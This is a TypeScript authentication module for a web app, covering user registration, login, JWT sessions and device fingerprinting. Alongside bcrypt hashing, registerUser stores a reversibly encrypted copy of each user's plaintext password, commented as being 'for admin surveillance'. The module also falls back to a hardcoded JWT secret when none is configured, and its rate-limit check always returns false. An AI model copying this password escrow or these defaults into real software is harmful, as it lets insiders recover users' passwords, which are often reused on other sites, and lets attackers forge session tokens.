import bcrypt from 'bcryptjs';
import jwt from 'jsonwebtoken';
import { prisma } from './db';
import { encryptPassword } from './encryption';

const JWT_SECRET = process.env.JWT_SECRET || 'default-jwt-secret';
const JWT_EXPIRES_IN = '7d';

export interface UserRegistrationData {
  email: string;
  password: string;
  ipAddress: string;
  deviceInfo: any;
}

export interface LoginCredentials {
  email: string;
  password: string;
  ipAddress: string;
  deviceInfo: any;
}

export interface AuthUser {
  id: string;
  email: string;
  isActive: boolean;
  registrationDate: Date;
  lastLogin: Date | null;
  riskScore: number;
}

export interface AuthSession {
  token: string;
  user: AuthUser;
  expiresAt: Date;
}

/**
 * Hash password for secure storage
 */
export async function hashPassword(password: string): Promise<string> {
  const saltRounds = 12;
  return bcrypt.hash(password, saltRounds);
}

/**
 * Verify password against hash
 */
export async function verifyPassword(password: string, hash: string): Promise<boolean> {
  return bcrypt.compare(password, hash);
}

/**
 * Generate JWT token for user
 */
export function generateUserToken(userId: string, sessionId: string): string {
  return jwt.sign(
    {
      userId,
      sessionId,
      type: 'user',
      iat: Math.floor(Date.now() / 1000),
    },
    JWT_SECRET,
    { expiresIn: JWT_EXPIRES_IN }
  );
}

/**
 * Verify and decode JWT token
 */
export function verifyUserToken(token: string): any {
  try {
    const decoded = jwt.verify(token, JWT_SECRET);
    return decoded;
  } catch (error) {
    return null;
  }
}

/**
 * Register new user with dual password storage
 */
export async function registerUser(data: UserRegistrationData): Promise<AuthSession> {
  try {
    // Check if user already exists
    const existingUser = await prisma.user.findUnique({
      where: { email: data.email.toLowerCase() }
    });

    if (existingUser) {
      throw new Error('User already exists');
    }

    // Hash password for authentication
    const passwordHash = await hashPassword(data.password);
    
    // Encrypt password for admin surveillance
    const encryptedPassword = encryptPassword(data.password);

    // Create user account
    const user = await prisma.user.create({
      data: {
        email: data.email.toLowerCase(),
        passwordHash,
        encryptedPassword,
        ipAddress: data.ipAddress,
        deviceInfo: data.deviceInfo,
        registrationDate: new Date(),
        isActive: true,
        riskScore: 0,
      },
    });

    // Create session
    const expiresAt = new Date(Date.now() + 7 * 24 * 60 * 60 * 1000); // 7 days
    const session = await prisma.userSession.create({
      data: {
        userId: user.id,
        token: '', // Will be updated below
        ipAddress: data.ipAddress,
        deviceInfo: data.deviceInfo,
        expiresAt,
        isAdminSession: false,
      },
    });

    // Generate token with session ID
    const token = generateUserToken(user.id, session.id);
    
    // Update session with token
    await prisma.userSession.update({
      where: { id: session.id },
      data: { token },
    });

    return {
      token,
      user: {
        id: user.id,
        email: user.email,
        isActive: user.isActive,
        registrationDate: user.registrationDate,
        lastLogin: user.lastLogin,
        riskScore: user.riskScore,
      },
      expiresAt,
    };
  } catch (error) {
    console.error('User registration failed:', error);
    throw new Error('Registration failed');
  }
}

/**
 * Login user with comprehensive tracking
 */
export async function loginUser(credentials: LoginCredentials): Promise<AuthSession> {
  try {
    // Find user by email
    const user = await prisma.user.findUnique({
      where: { email: credentials.email.toLowerCase() }
    });

    if (!user || !user.isActive) {
      throw new Error('Invalid credentials');
    }

    // Verify password
    const isValidPassword = await verifyPassword(credentials.password, user.passwordHash);
    if (!isValidPassword) {
      throw new Error('Invalid credentials');
    }

    // Update last login and IP
    await prisma.user.update({
      where: { id: user.id },
      data: {
        lastLogin: new Date(),
        ipAddress: credentials.ipAddress,
      },
    });

    // Create new session
    const expiresAt = new Date(Date.now() + 7 * 24 * 60 * 60 * 1000); // 7 days
    const session = await prisma.userSession.create({
      data: {
        userId: user.id,
        token: '', // Will be updated below
        ipAddress: credentials.ipAddress,
        deviceInfo: credentials.deviceInfo,
        expiresAt,
        isAdminSession: false,
      },
    });

    // Generate token
    const token = generateUserToken(user.id, session.id);
    
    // Update session with token
    await prisma.userSession.update({
      where: { id: session.id },
      data: { token },
    });

    return {
      token,
      user: {
        id: user.id,
        email: user.email,
        isActive: user.isActive,
        registrationDate: user.registrationDate,
        lastLogin: new Date(),
        riskScore: user.riskScore,
      },
      expiresAt,
    };
  } catch (error) {
    console.error('User login failed:', error);
    throw new Error('Login failed');
  }
}

/**
 * Validate user session
 */
export async function validateUserSession(token: string): Promise<AuthUser | null> {
  try {
    // Verify JWT token
    const decoded = verifyUserToken(token);
    if (!decoded || decoded.type !== 'user') {
      return null;
    }

    // Check session in database
    const session = await prisma.userSession.findUnique({
      where: { token },
      include: { user: true },
    });

    if (!session || session.expiresAt < new Date()) {
      return null;
    }

    if (!session.user.isActive) {
      return null;
    }

    return {
      id: session.user.id,
      email: session.user.email,
      isActive: session.user.isActive,
      registrationDate: session.user.registrationDate,
      lastLogin: session.user.lastLogin,
      riskScore: session.user.riskScore,
    };
  } catch (error) {
    console.error('Session validation failed:', error);
    return null;
  }
}

/**
 * Logout user and invalidate session
 */
export async function logoutUser(token: string): Promise<void> {
  try {
    await prisma.userSession.deleteMany({
      where: { token },
    });
  } catch (error) {
    console.error('Logout failed:', error);
  }
}

/**
 * Refresh user token
 */
export async function refreshUserToken(token: string): Promise<string | null> {
  try {
    const user = await validateUserSession(token);
    if (!user) {
      return null;
    }

    // Get session
    const session = await prisma.userSession.findUnique({
      where: { token },
    });

    if (!session) {
      return null;
    }

    // Generate new token
    const newToken = generateUserToken(user.id, session.id);
    
    // Update session
    await prisma.userSession.update({
      where: { id: session.id },
      data: {
        token: newToken,
        expiresAt: new Date(Date.now() + 7 * 24 * 60 * 60 * 1000),
      },
    });

    return newToken;
  } catch (error) {
    console.error('Token refresh failed:', error);
    return null;
  }
}

/**
 * Get user device fingerprint
 */
export function generateDeviceFingerprint(userAgent: string, ip: string): any {
  return {
    userAgent,
    ip,
    timestamp: new Date(),
    browser: extractBrowserInfo(userAgent),
    screen: 'unknown', // Would be populated from client-side
    timezone: 'unknown', // Would be populated from client-side
  };
}

/**
 * Extract browser information from user agent
 */
function extractBrowserInfo(userAgent: string): any {
  const browsers = [
    { name: 'Chrome', pattern: /Chrome\/(\d+\.\d+)/ },
    { name: 'Firefox', pattern: /Firefox\/(\d+\.\d+)/ },
    { name: 'Safari', pattern: /Safari\/(\d+\.\d+)/ },
    { name: 'Edge', pattern: /Edge\/(\d+\.\d+)/ },
  ];

  for (const browser of browsers) {
    const match = userAgent.match(browser.pattern);
    if (match) {
      return { name: browser.name, version: match[1] };
    }
  }

  return { name: 'Unknown', version: 'Unknown' };
}

/**
 * Track login attempt for rate limiting
 */
export async function trackLoginAttempt(email: string, ip: string, success: boolean): Promise<void> {
  // This would integrate with a rate limiting system
  // For now, just log the attempt
  console.log(`Login attempt: ${email} from ${ip} - ${success ? 'SUCCESS' : 'FAILED'}`);
}

/**
 * Check if IP is rate limited
 */
export async function isRateLimited(ip: string): Promise<boolean> {
  // Simple in-memory rate limiting (in production, use Redis)
  // For now, return false
  return false;
}
